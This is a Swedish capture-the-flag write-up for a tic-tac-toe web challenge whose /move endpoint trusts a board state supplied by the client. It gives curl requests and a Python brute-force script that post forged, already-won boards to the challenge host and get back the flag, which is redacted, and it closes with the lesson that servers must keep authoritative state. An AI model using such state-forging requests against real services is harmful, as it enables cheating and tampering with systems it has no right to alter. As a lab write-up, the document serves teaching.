# Tre-i-Rad — Svenska

**Kategori:** Webb. **Poäng:** 1000.
**Mål:** `http://treirad.challs.crate.nu`
**Flaggformat:** `cratectf{...}` (det bokstavliga värdet är redigerat — du återskapar
det själv).

Ett luffarschack-spel vars `/move`-endpoint i praktiken är **tillståndslös**: klienten
skickar hela brädet plus ett dragantal, och servern litar på båda. Den validerar
antalet pjäser men inte om brädet är nåbart genom lagligt spel — så ett förfalskat
redan-vunnet bräde returnerar flaggan.

## 1. Spana in klienten

Hämta `/treirad.js` (spelets skript):

```bash
curl -s http://treirad.challs.crate.nu/treirad.js
```

Det avslöjar protokollet:

* Metod `POST` till `http://treirad.challs.crate.nu/move`
* JSON-kropp `{"board": [...9 rutor...], "move_count": <int>}`
  * `board` är 9 rutor, var och en `"X"`, `"O"` eller `null`
  * `move_count` är totala antalet placerade pjäser
* Svar `{"index": <serverdrag eller -1>, "server_msg": <sträng>}`
  * `server_msg` bär vinst/förlust-texten; vid en spelarvinst (X) innehåller den flaggan.

Att spela rättvist mot server-AI:n ger alltid bara oavgjort, så du kan inte vinna
legitimt.

## 2. Sårbarheten

Validering på serversidan kontrollerar endast:

* att `move_count` är lika med summan av X- och O-pjäser på det inskickade brädet, och
* att ingen ruta är dubbelfylld.

Den kontrollerar **inte**:

* om brädet är nåbart genom växelvis lagliga drag,
* om en spelare redan hade vunnit tidigare,
* dragsekvensen eller något tidigare tillstånd som servern håller.

Så du kan skicka in vilket bräde som helst där X redan har tre i rad, så länge
pjäsantalet är konsekvent (X spelar först ⇒ `x_count == o_count` eller
`x_count == o_count + 1`).

## 3. Exploit

Skicka in ett bräde där X har översta raden med ett konsekvent pjäsantal. För
`["X","X","X","O","O",null,null,null,null]` finns 3 X och 2 O, så `move_count = 5`:

```bash
curl -s -X POST http://treirad.challs.crate.nu/move \
  -H "Content-Type: application/json" \
  -d '{"board":["X","X","X","O","O",null,null,null,null],"move_count":5}'
```

Svar:

```json
{"index": -1, "server_msg": "cratectf{...}"}
```

Ett alternativt vinnande bräde som också fungerar (X översta raden, 3 X / 2 O, antal 5):

```bash
curl -s -X POST http://treirad.challs.crate.nu/move \
  -H "Content-Type: application/json" \
  -d '{"board":["X","X","X",null,"O",null,null,"O",null],"move_count":5}'
```

### Vad svaret visar

* `"index": -1` — servern väljer inget drag (partiet är redan avgjort).
* `"server_msg"` — innehåller flaggan i formatet `cratectf{...}`, eftersom servern ser
  att X redan har en vinnande linje och skickar vinstmeddelandet direkt.

Vilket X-vinnande bräde som helst med konsekvent pjäsantal returnerar samma flagga; du
behöver inte brute-force-loopen nedan, men den visar hur hela vinstrummet utforskades:

```python
import requests
from itertools import combinations
WINS = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]]
def winner(b):
    for a,c,d in WINS:
        if b[a] and b[a]==b[c]==b[d]: return b[a]
def legal(b):
    x=b.count('X'); o=b.count('O'); return x==o or x==o+1
for xs in combinations(range(9),3):
    if any(set(w)<=set(xs) for w in WINS):
        base=[None]*9
        for p in xs: base[p]='X'
        rem=[i for i in range(9) if base[i] is None]
        for k in range(len(xs)):
            for os in combinations(rem,k):
                b=base[:]
                for p in os: b[p]='O'
                if legal(b) and winner(b)=='X':
                    r=requests.post("http://treirad.challs.crate.nu/move",
                                    json={"board":b,"move_count":b.count('X')+b.count('O')})
                    if "cratectf{" in r.json().get("server_msg",""):
                        print(r.json()); raise SystemExit
```

## Verifiering

Plattformsbekräftat löst. En enda `POST /move` med ett förfalskat redan-vunnet bräde och
ett matchande `move_count` returnerar `{"index": -1, "server_msg": "cratectf{...}"}`.

## Grundorsak / lärdom

Lita aldrig på klientlevererat speltillstånd. Servern måste hålla auktoritativt tillstånd
och validera att varje inskickat bräde är nåbart från det föregående genom exakt ett
lagligt drag — inte bara räkna pjäser.
